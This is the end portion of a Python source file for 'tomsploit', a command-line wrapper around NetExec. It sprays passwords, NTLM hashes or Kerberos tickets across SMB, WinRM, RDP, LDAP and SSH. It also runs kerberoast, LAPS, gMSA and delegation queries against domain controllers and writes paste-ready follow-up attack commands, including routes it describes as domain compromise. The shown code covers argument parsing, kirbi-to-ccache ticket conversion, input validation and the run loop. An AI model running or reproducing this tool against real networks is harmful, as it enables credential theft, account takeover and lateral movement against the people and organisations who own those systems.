                                    f"{s.user}:{s.secret or '(ccache)'}{adm}\n")
                    else:
                        f.write("  no valid credentials\n")
        except OSError as exc:
            print(f"  {YELLOW}[!] Could not write log file: {exc}{RESET}")


# ─── CLI ───────────────────────────────────────────────────────────────

class _BlankCollapser:
    """Wraps a stream and collapses any run of 2+ consecutive blank lines
    into a single blank line. The report is assembled from many independent
    section methods, several of which both end with a trailing blank and
    begin with a leading blank; rather than couple those methods together,
    we normalise vertical whitespace at one choke point. Only touches
    newline bookkeeping — every other character passes through untouched.
    Progress output goes to stderr, so it is unaffected."""

    def __init__(self, stream):
        self._s = stream
        self._pending_blanks = 0
        self._at_line_start = True

    def write(self, text: str) -> int:
        if not text:
            return 0
        for line in text.splitlines(keepends=True):
            has_nl = line.endswith("\n")
            content = line[:-1] if has_nl else line
            is_blank = self._at_line_start and content.strip() == ""
            if has_nl and is_blank:
                # Defer blank lines; emit at most one before real content.
                self._pending_blanks += 1
                self._at_line_start = True
            else:
                if self._pending_blanks:
                    self._s.write("\n")
                    self._pending_blanks = 0
                self._s.write(line)
                self._at_line_start = has_nl
        return len(text)

    def flush(self) -> None:
        self._s.flush()

    def __getattr__(self, name):
        return getattr(self._s, name)


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(
        prog="tomsploit",
        description="Fast NetExec (nxc) triage: spray a credential set across "
                    "protocols, confirm what's valid, and print the exact "
                    "follow-up commands for each win. Enumeration only — it "
                    "finds and reports access, it does not exploit, dump, or "
                    "loot (it hands you the commands to do that yourself).",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
examples:
  tomsploit -t 192.168.1.10 -u admin -p 'Password123'
  tomsploit -t 192.168.1.0/24 -u users.txt -p passwords.txt
  tomsploit -t target.htb -u admin -H aad3b...:31d6cfe0...
  tomsploit -t 192.168.1.10 -u users.txt -H hashes.txt --paired
  tomsploit -t 192.168.1.10 --combo creds.txt
  tomsploit -t 192.168.1.10 -u admin -k
  tomsploit -t 192.168.1.10 -u admin -p pw --protocols smb,winrm,rdp
  tomsploit -t targets.txt -u u.txt -p p.txt --creds-file creds.tsv
  tomsploit -t 192.168.1.10 -u admin -p pw --sh > next.sh   # paste-ready commands

  # Kerberos delegation is automatic: a valid DC login triggers the enrichment
  # pass, which writes tomsploit-delegation-<ip>-<user>.txt with the routes.
  tomsploit -t 10.10.10.5 -u carole -p pw              # deleg file written if found
  tomsploit -t 10.10.10.5 -u carole -p pw --no-enrich  # skip the extra queries

  # Or run the delegation engine offline on findDelegation output you have:
  nxc ldap 10.10.10.5 -u u -p p --find-delegation | tomsploit --deleg-in - -t 10.10.10.5 -d corp1.com --dc-name DC01 -u u -p p
""",
    )
    p.add_argument("-t", "--target",
                   help="IP, hostname, CIDR, or file containing any of these. "
                        "Required except with --deleg-in, where it is optional "
                        "and supplies the DC IP for the emitted commands.")
    p.add_argument("-u", "--user",
                   help="Username or path to users file. "
                        "(Optional when --combo is used.)")
    p.add_argument("-p", "--password",
                   help="Password or path to passwords file.")
    p.add_argument("-H", "--hash",
                   help="NTLM hash (LM:NT or NT). May be a file of hashes.")
    p.add_argument("-d", "--domain", metavar="DOMAIN",
                   help="AD domain, passed to nxc as -d for domain-scope auth. "
                        "Use when nxc guesses wrong, or when the target's own "
                        "output doesn't name a domain. Ignored for "
                        "--local-auth attempts.")
    p.add_argument("-k", "--kerberos", nargs="?", const=True, default=False,
                   metavar="TICKET",
                   help="Authenticate with a Kerberos ticket cache "
                        "(nxc --use-kcache) instead of -p/-H. "
                        "With no argument, uses the ticket already in "
                        "$KRB5CCNAME. Optionally give a PATH to a ticket file: "
                        "tomsploit auto-detects whether it's a ccache or a "
                        "kirbi (raw DER or base64), converts a kirbi to ccache "
                        "for you (needs impacket-ticketConverter), and exports "
                        "KRB5CCNAME itself. NOTE: -u must match the ticket's "
                        "principal, and the target should be the DC's FQDN — an "
                        "SPN needs a name, not an IP. Cannot mix with -p/-H.")
    p.add_argument("--paired", action="store_true",
                   help="Positional pairing instead of cross-spray: line N of "
                        "the users file is tried only against line N of the "
                        "password/hash file (e.g. dumped usernames.txt + "
                        "hashes.txt). All provided lists must be the same length.")
    p.add_argument("--combo", metavar="FILE",
                   help="Combined 'user:secret' file, one pair per line "
                        "(implies positional pairing). Each secret is "
                        "auto-detected: an NTLM hash (32 hex, or LM:NT) is "
                        "tried as Pass-the-Hash, anything else as a password. "
                        "Replaces -u/-p/-H; split on the first ':' so "
                        "passwords may contain colons.")
    p.add_argument("--deleg-in", metavar="FILE", dest="deleg_in",
                   help="Offline mode: read findDelegation / "
                        "'nxc --find-delegation' table output and emit the "
                        "delegation routes for whatever it contains (same "
                        "GET/REQUIRED/MISSING/WHY format as a live scan), with "
                        "account and target names filled in. Use '-' for "
                        "stdin. Scans and spawns nothing, so the roastability/ "
                        "MAQ/DACL enrichment does NOT run here — pass --dc-name "
                        "for the on-DC delegation check, and -d/-u/-p/-H to "
                        "fill your own credential into the commands.")
    p.add_argument("--dc-name", metavar="NAME", dest="dc_name",
                   help="DC short hostname (e.g. DC01), used with --deleg-in "
                        "so tomsploit can spot a delegation SPN pointing at "
                        "the DC itself — which is domain compromise via an "
                        "ldap/ sname swap, not a lateral move. A live scan "
                        "learns this by itself.")
    p.add_argument("-o", "--output",
                   help="Write a consolidated scan log here (raw command output + a per-target summary). No default: omit -o and no log is written.")
    p.add_argument("--creds-file", metavar="FILE",
                   help="Append valid credentials to a TSV file.")
    p.add_argument("-w", "--workers", type=int, default=DEFAULT_WORKERS,
                   help=f"Parallel workers (default: {DEFAULT_WORKERS}).")
    p.add_argument("--protocols", metavar="LIST",
                   help=f"Comma-separated subset. Valid: {','.join(ALL_PROTOCOLS)}")
    p.add_argument("--max-attempts", type=int, default=DEFAULT_MAX_ATTEMPTS,
                   metavar="N",
                   help=f"Refuse runs needing more than N nxc spawns "
                        f"(default: {DEFAULT_MAX_ATTEMPTS}). tomsploit sprays a "
                        f"credential set - wordlists belong in hydra.")
    p.add_argument("--force", action="store_true",
                   help="Run even if the attempt count exceeds --max-attempts.")
    p.add_argument("--no-port-probe", action="store_true",
                   help="Skip pre-flight TCP port probe.")
    p.add_argument("--no-enrich", action="store_true",
                   help="Skip the post-scan LDAP enrichment pass. By default, "
                        "when an LDAP credential works on a DC, tomsploit runs "
                        "a batch of read-only queries and feeds the results "
                        "into the delegation routes: --find-delegation, plus "
                        "-M laps / --gmsa / -M adcs / -M maq and a kerberoast "
                        "sweep (six in parallel), then a targeted "
                        "servicePrincipalName/userAccountControl query and a "
                        "per-account daclread over the delegation accounts. "
                        "The results resolve each route (roastable now? "
                        "disabled? MAQ 0? who can write it?) and drop "
                        "LAPS/gMSA/ADCS blocks the domain has nothing for. All "
                        "read-only; costs roughly a dozen nxc spawns per DC.")
    p.add_argument("--bare", action="store_true",
                   help="Commands only — no outcome hints, no labels, no "
                        "prose. The most compact output there is.")
    p.add_argument("--notes", action="store_true",
                   help="Keep the explanatory comments in the suggested "
                        "commands. Off by default: the output is the next "
                        "command, not a walkthrough. --notes restores the "
                        "reasoning, the caveats and the commented-out "
                        "alternatives.")
    p.add_argument("--deleg-inline", action="store_true", dest="deleg_inline",
                   help="Print the full delegation command blocks in the "
                        "terminal instead of summarising them and writing "
                        "them to a file. (--sh always inlines them, since "
                        "that output is already going to a file.)")
    p.add_argument("--deleg-out", metavar="FILE", dest="deleg_out",
                   help="Where to write the delegation command set. Default is "
                        "./tomsploit-delegation-<ip>-<user>.txt — keyed on the "
                        "account too, because the commands are written for "
                        "whoever ran the scan, so a second account against the "
                        "same DC does NOT overwrite the first. An explicit path "
                        "here is used verbatim (you manage collisions).")
    p.add_argument("--max-cidr-hosts", type=int, default=DEFAULT_MAX_CIDR_HOSTS,
                   help=f"Max hosts in any one CIDR (default: {DEFAULT_MAX_CIDR_HOSTS}).")
    verbosity = p.add_mutually_exclusive_group()
    verbosity.add_argument("-q", "--quiet", action="store_true",
                   help="Minimal output: just valid creds + suggested "
                        "commands (and any credential alarms).")
    verbosity.add_argument("-v", "--verbose", action="store_true",
                   help="Show every nxc line, including each failed login "
                        "(off by default — failures collapse to a count).")
    verbosity.add_argument("--sh", action="store_true",
                   help="Emit ONLY the suggested commands, flush-left, "
                        "uncoloured, with findings as # comments — a "
                        "paste-ready shell script. Progress and hits go to "
                        "stderr, so `tomsploit ... --sh > next.sh` works.")
    p.add_argument("--no-color", action="store_true",
                   help="Disable ANSI colors.")
    p.add_argument("--debug", action="store_true",
                   help="Print full Python tracebacks on errors.")
    p.add_argument("--json-output", metavar="FILE",
                   help="Write structured results to a JSON file.")
    return p.parse_args()


def _detect_ticket_format(raw: bytes) -> str:
    """Classify a ticket blob by content, not extension (filenames lie).

        ccache      MIT FILE credential cache — starts 0x05 0x0[1-4]
                    (0x05 = format tag, next byte = minor version 1..4)
        kirbi       DER-encoded KRB-CRED — [APPLICATION 22] = 0x76
        kirbi_b64   base64 text that decodes to a kirbi (Rubeus /nowrap,
                    or anything copy-pasted). Real tickets are >128 bytes,
                    so the base64 almost always begins 'doI', but we decode
                    and re-check the 0x76 tag rather than trust the prefix.
        unknown     none of the above
    """
    if len(raw) >= 2 and raw[0] == 0x05 and raw[1] in (0x01, 0x02, 0x03, 0x04):
        return "ccache"
    if raw[:1] == b"\x76":
        return "kirbi"
    # Maybe base64. Strip whitespace, validate the alphabet, decode, re-check.
    compact = bytes(c for c in raw if c not in b" \t\r\n")
    if compact and re.fullmatch(rb"[A-Za-z0-9+/]+={0,2}", compact):
        try:
            decoded = base64.b64decode(compact, validate=True)
        except Exception:
            return "unknown"
        if decoded[:1] == b"\x76":
            return "kirbi_b64"
    return "unknown"


def _ticket_converter_cmd() -> list[str] | None:
    """Locate impacket's ticketConverter under either name it ships as."""
    exe = shutil.which("impacket-ticketConverter") or shutil.which("ticketConverter.py")
    return [exe] if exe else None


def load_kerberos_ticket(path: str) -> str:
    """Resolve a ticket PATH to an absolute ccache path, converting a kirbi
    (raw or base64) to ccache on the way. Returns the ccache path; the caller
    exports it as KRB5CCNAME. Raises ValueError with a user-facing message on
    anything that can't be turned into a usable ccache."""
    if not os.path.isfile(path):
        raise ValueError(f"-k: ticket file not found: {path}")
    try:
        with open(path, "rb") as fh:
            raw = fh.read(1 << 20)          # tickets are a few KB; cap defensively
    except OSError as exc:
        raise ValueError(f"-k: cannot read ticket {path}: {exc}")

    kind = _detect_ticket_format(raw)

    if kind == "ccache":
        return os.path.abspath(path)

    if kind == "unknown":
        raise ValueError(
            f"-k: '{path}' isn't a recognised ticket. Expected a ccache "
            f"(starts 0x05), a kirbi (starts 0x76), or base64 of a kirbi. "
            f"If this came from Rubeus, pass the base64 blob or a .kirbi.")

    # From here it's a kirbi (kind in {'kirbi','kirbi_b64'}) and needs converting.
    conv = _ticket_converter_cmd()
    if conv is None:
        raise ValueError(
            "-k: this ticket is a kirbi and needs converting to ccache, but "
            "impacket-ticketConverter isn't on PATH. Install impacket "
            "(apt install python3-impacket), or convert it yourself and pass "
            "the .ccache.")

    workdir = tempfile.mkdtemp(prefix="tomsploit_ticket_")
    if kind == "kirbi_b64":
        # Decode to a real .kirbi first; ticketConverter wants DER on disk.
        compact = bytes(c for c in raw if c not in b" \t\r\n")
        kirbi_path = os.path.join(workdir, "ticket.kirbi")
        with open(kirbi_path, "wb") as fh:
            fh.write(base64.b64decode(compact, validate=True))
        src = kirbi_path
    else:
        src = os.path.abspath(path)

    ccache_path = os.path.join(workdir, "ticket.ccache")
    try:
        proc = subprocess.run(conv + [src, ccache_path],
                              stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                              text=True, timeout=30)
    except (OSError, subprocess.TimeoutExpired) as exc:
        raise ValueError(f"-k: ticketConverter failed to run: {exc}")
    if proc.returncode != 0 or not os.path.isfile(ccache_path):
        detail = proc.stdout.strip().splitlines()[-1] if proc.stdout.strip() else \
                 f"exit {proc.returncode}"
        raise ValueError(f"-k: kirbi→ccache conversion failed ({detail}).")
    return ccache_path


def build_config(args: argparse.Namespace) -> Config:
    """Validate the parsed args and expand files/CIDRs into one Config.
    Raises ValueError with a user-facing message on any bad combination."""
    # -k is nargs='?': False when absent, True with no path, or a PATH string.
    # Collapse to a bool for all the logic below, and if a path was given,
    # resolve it to a ccache and export KRB5CCNAME now so every nxc child
    # (which inherits this process's environment) picks it up.
    kerberos_on = bool(args.kerberos)
    ticket_path = args.kerberos if isinstance(args.kerberos, str) else None
    args.kerberos = kerberos_on

    raw_targets = read_value_or_file(args.target, "targets")
    targets = expand_targets(raw_targets, args.max_cidr_hosts)
    if not targets:
        raise ValueError("No targets after expansion.")

    paired = args.paired

    if args.combo:
        # Combined user:secret file. Supplies its own users + secrets and
        # always runs positional (paired). Cannot mix with -u/-p/-H/-k.
        if args.user or args.password or args.hash or args.kerberos:
            raise ValueError("--combo replaces -u/-p/-H/-k; don't pass them together.")
        users, passwords, hashes, warns = parse_combo_file(args.combo)
        for w in warns:
            print(f"{YELLOW}--combo {w}{RESET}", file=sys.stderr)
        if not users:
            raise ValueError(f"--combo: no usable 'user:secret' lines in '{args.combo}'.")
        paired = True
    else:
        if args.kerberos and (args.password or args.hash):
            raise ValueError("-k cannot combine with -p or -H.")
        if args.kerberos and paired:
            # kerberos builds one ticket-cache cred per user, so there is no
            # secret list to pair against; accepting the flag silently
            # implied a pairing that never happened.
            raise ValueError("--paired has no meaning with -k (a ticket cache "
                             "has no secret list to pair against).")
        if not args.kerberos and not args.password and not args.hash:
            raise ValueError("need one of -p, -H, --combo, or -k.")
        if not args.user:
            raise ValueError("need -u (or use --combo).")

        users = read_value_or_file(args.user, "users")
        if not users:
            raise ValueError("No users provided.")
        passwords = read_value_or_file(args.password, "passwords") if args.password else []
        hashes = read_value_or_file(args.hash, "hashes") if args.hash else []

        if paired:
            # (kerberos and no-secret are already rejected by the generic
            # checks above; paired only adds the length-agreement rules.)
            # In paired mode the user list must line up with each secret list.
            if len(users) == 1:
                raise ValueError(
                    "--paired expects a users FILE with one user per line "
                    "(got a single user). Use the default mode for one user.")
            if passwords and len(passwords) != len(users):
                raise ValueError(
                    f"--paired: users ({len(users)}) and passwords "
                    f"({len(passwords)}) must have the same number of lines.")
            if hashes and len(hashes) != len(users):
                raise ValueError(
                    f"--paired: users ({len(users)}) and hashes "
                    f"({len(hashes)}) must have the same number of lines.")

    protocols = parse_protocol_list(args.protocols)
    if not protocols:
        raise ValueError("No protocols selected.")

    log_file = args.output            # only write a log when -o/--output is given

    # A ticket path only survives validation in the -k (non-combo) path.
    # Resolve it to a ccache (converting a kirbi if needed) and export it;
    # _run_proc spawns nxc with the inherited environment, so this is all
    # that "give it the ticket" requires.
    if ticket_path is not None:
        ccache = load_kerberos_ticket(ticket_path)   # raises ValueError on failure
        os.environ["KRB5CCNAME"] = ccache
        print(f"{DIM}🎫 KRB5CCNAME set to {ccache}{RESET}", file=sys.stderr)

    return Config(
        targets=targets, users=users, passwords=passwords, hashes=hashes,
        kerberos=args.kerberos, protocols=protocols, log_file=log_file,
        creds_file=args.creds_file, json_out=args.json_output,
        workers=args.workers, quiet=args.quiet, verbose=args.verbose,
        debug=args.debug, no_port_probe=args.no_port_probe,
        paired=paired, domain=(args.domain or "").strip(),
        force=args.force, max_attempts=args.max_attempts,
        sh_only=args.sh, no_enrich=args.no_enrich,
        deleg_inline=args.deleg_inline, deleg_out=(args.deleg_out or ""),
        notes=args.notes, bare=args.bare,
    )


def main() -> int:
    args = parse_args()
    # --sh must emit a clean script: no ANSI, ever.
    configure_colors(args.no_color or args.sh)

    # --deleg-in is an offline transform: it spawns nothing, needs no
    # credential set and no target list, so it short-circuits ahead of
    # build_config (which would otherwise demand both).
    if args.deleg_in:
        return run_deleg_mode(args)

    if not args.target:
        print(f"{RED}{BOLD}Error:{RESET} -t/--target is required "
              f"(only --deleg-in may omit it).", file=sys.stderr)
        return 1

    try:
        cfg = build_config(args)
        reporter = Reporter(cfg)
        runner = TomSploit(cfg, reporter)
    except ValueError as exc:
        print(f"{RED}{BOLD}Error:{RESET} {exc}", file=sys.stderr)
        return 1

    # nxc is only required for the protocols that use it; SSH uses the ssh client,
    # so `--protocols ssh` works on a box that doesn't have NetExec installed.
    nxc_protos = [p for p in cfg.protocols if p != "ssh"]
    if nxc_protos and not shutil.which("nxc"):
        print(f"{RED}{BOLD}Error:{RESET} 'nxc' (NetExec) not on PATH — required for "
              f"{', '.join(nxc_protos)}. Install NetExec, or use --protocols ssh.",
              file=sys.stderr)
        return 1
    if not nxc_protos and not shutil.which("ssh"):
        print(f"{RED}{BOLD}Error:{RESET} ssh client not on PATH "
              f"(needed for --protocols ssh).", file=sys.stderr)
        return 1

    interrupted = {"n": 0}

    def _sigint(_signum, _frame):
        interrupted["n"] += 1
        if interrupted["n"] == 1:
            sys.stderr.write(
                f"\n  {YELLOW}{BOLD}⚠ Cancelling — Ctrl-C again to force.{RESET}\n"
            )
            sys.stderr.flush()
            runner.cancel()
        else:
            os._exit(130)
    signal.signal(signal.SIGINT, _sigint)

    def _sigterm(signum, _frame):
        """SIGTERM / SIGHUP: cancel cleanly instead of dying where we stand.

        Closing the terminal on a long run sends SIGHUP, and the default
        disposition is immediate death — which used to mean the log summary
        and the final JSON were never written. Route both through the same
        cancel path as Ctrl-C so run()'s finally block still flushes."""
        name = "SIGHUP" if signum == getattr(signal, "SIGHUP", -1) else "SIGTERM"
        sys.stderr.write(f"\n  {YELLOW}{BOLD}⚠ {name} — flushing results and "
                         f"stopping.{RESET}\n")
        sys.stderr.flush()
        runner.cancel()
    for _sig in ("SIGTERM", "SIGHUP"):
        if hasattr(signal, _sig):
            try:
                signal.signal(getattr(signal, _sig), _sigterm)
            except (ValueError, OSError):
                pass   # not the main thread, or unsupported platform

    _real_stdout = sys.stdout
    sys.stdout = _BlankCollapser(_real_stdout)
    try:
        return runner.run()
    except KeyboardInterrupt:
        runner.cancel()
        return 130
    finally:
        sys.stdout.flush()
        sys.stdout = _real_stdout


if __name__ == "__main__":
    sys.exit(main())

# ── MIT License ────────────────────────────────────────────────────────
# Copyright (c) 2026 Kazgangap
# Modifications Copyright (c) 2026 twhitehead290
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND.
